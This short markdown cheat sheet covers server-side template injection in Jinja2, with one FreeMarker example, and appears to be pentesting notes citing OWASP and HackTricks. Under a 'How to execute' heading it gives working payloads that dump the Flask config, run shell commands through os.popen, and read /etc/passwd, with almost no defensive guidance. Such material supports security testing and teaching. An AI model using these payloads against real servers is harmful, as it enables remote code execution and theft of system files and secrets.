# Template Injection Vulnerability (SSTI)

Dependencies using Template Injection: Jinja2 (Python), Twig (PHP), FreeMarker (Java), etc.

The attack occurs when the data input is insecure and the user incorporates it into the template, leading to remote code execution on the server.

## How to execute

* Identify the model language, in this case: {{ }} for Jinja2

obs. Global objects (request, config) return functions that provide access to "child" files.
obs. FreeMaker example: ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

## Scenario 1: Get Configuration
{{ config.items() }}

## Scenario 2: Read Global Environment
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

## Scenario 3: Get Password
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}


## References

https://pypi.org/project/Jinja2/

https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection

https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti